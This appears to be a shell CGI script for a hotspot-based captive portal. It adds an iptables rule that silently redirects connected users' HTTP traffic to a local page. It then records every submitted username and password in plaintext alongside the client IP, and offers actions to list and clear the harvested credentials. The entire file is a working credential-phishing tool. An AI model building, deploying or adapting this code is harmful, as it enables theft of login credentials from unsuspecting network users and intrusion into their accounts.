#!/bin/sh
# portal.cgi — Captive portal: enable/disable redirect + credential collection
# actions: enable, disable, status, submit (POST), list, clear

CREDS=/cache/raytrap/portal_creds.txt
PORTAL_CHAIN=PORTAL_REDIRECT
IPT="sh /cache/ipt/ipt_ctl.sh iptables"

printf 'Content-Type: application/json\r\n\r\n'

if [ "$REQUEST_METHOD" = "POST" ]; then
    QUERY_STRING=$(cat 2>/dev/null)
fi

urldecode() {
    printf '%s\n' "$1" | sed 's/+/ /g; s/%\([0-9A-Fa-f][0-9A-Fa-f]\)/\\x\1/g' | \
        while IFS= read -r L; do printf '%b\n' "$L"; done
}
param() {
    local raw
    raw=$(printf '%s' "$QUERY_STRING" | tr '&' '\n' | grep "^${1}=" | head -1 | cut -d= -f2-)
    urldecode "$raw"
}
ok()  { printf '{"ok":true,"data":%s}\n' "${1:-null}"; }
err() { printf '{"ok":false,"error":"%s"}\n' "$(printf '%s' "$1" | sed 's/"/\\"/g')"; }
jstr(){ printf '"%s"' "$(printf '%s' "$1" | sed 's/\\/\\\\/g; s/"/\\"/g')"; }

ACTION=$(param action)

# Check if ipt daemon is available
check_daemon() { [ -p /cache/ipt/cmd.fifo ]; }

# Check if captive portal redirect rule is active
is_enabled() {
    $IPT -t nat -L ORBIC_PREROUTING -n 2>/dev/null | grep -q 'REDIRECT.*8888'
}

case "$ACTION" in

enable)
    check_daemon || { err "iptables daemon not running"; exit 0; }
    if is_enabled; then
        ok '{"status":"already_enabled"}'
        exit 0
    fi
    mkdir -p "$(dirname "$CREDS")" 2>/dev/null
    # Add REDIRECT rule: intercept port 80 on bridge0, redirect to httpd (8888)
    # Insert as rule 1 in ORBIC_PREROUTING so it takes priority
    OUT=$($IPT -t nat -I ORBIC_PREROUTING 1 -i bridge0 -p tcp --dport 80 \
        -j REDIRECT --to-ports 8888 2>&1)
    if [ $? -eq 0 ]; then
        ok '{"status":"enabled"}'
    else
        ERR=$(printf '%s' "$OUT" | sed 's/"/'"'"'/g')
        err "iptables failed: $ERR"
    fi
    ;;

disable)
    check_daemon || { err "iptables daemon not running"; exit 0; }
    # Remove the REDIRECT rule (delete by specification — idempotent)
    $IPT -t nat -D ORBIC_PREROUTING -i bridge0 -p tcp --dport 80 \
        -j REDIRECT --to-ports 8888 2>/dev/null
    ok '{"status":"disabled"}'
    ;;

status)
    enabled=false
    is_enabled && enabled=true
    count=0
    [ -f "$CREDS" ] && count=$(wc -l < "$CREDS" 2>/dev/null | tr -d ' ')
    [ -z "$count" ] && count=0
    ok '{"enabled":'"$enabled"',"credential_count":'"$count"'}'
    ;;

submit)
    USER=$(param user)
    PASS=$(param pass)
    CLIENT_IP="${REMOTE_ADDR:-unknown}"
    NOW=$(date +%s 2>/dev/null || printf '0')

    # Basic validation — require non-empty fields
    [ -z "$USER" ] && { err "username required"; exit 0; }
    [ -z "$PASS" ] && { err "password required"; exit 0; }

    # Sanitize for single-line storage (strip newlines, tabs)
    USER_CLEAN=$(printf '%s' "$USER" | tr -d '\n\r\t')
    PASS_CLEAN=$(printf '%s' "$PASS" | tr -d '\n\r\t')

    mkdir -p "$(dirname "$CREDS")" 2>/dev/null
    # Log: timestamp|ip|user|pass
    printf '%s|%s|%s|%s\n' "$NOW" "$CLIENT_IP" "$USER_CLEAN" "$PASS_CLEAN" >> "$CREDS"

    ok '{"status":"logged","ip":"'"$CLIENT_IP"'"}'
    ;;

list)
    if [ ! -f "$CREDS" ] || [ ! -s "$CREDS" ]; then
        ok '{"credentials":[]}'
        exit 0
    fi
    JSON=$(awk -F'|' '
    NF==4 {
        ts=$1; ip=$2; user=$3; pass=$4
        # Escape quotes
        gsub(/"/, "\\\"", user)
        gsub(/"/, "\\\"", pass)
        if (NR>1) printf ","
        printf "{\"ts\":%s,\"ip\":\"%s\",\"user\":\"%s\",\"pass\":\"%s\"}", ts, ip, user, pass
    }' "$CREDS" 2>/dev/null)
    ok '{"credentials":['"$JSON"']}'
    ;;

clear)
    > "$CREDS" 2>/dev/null
    ok '{"status":"cleared"}'
    ;;

*)
    err "unknown action: $ACTION"
    ;;

esac
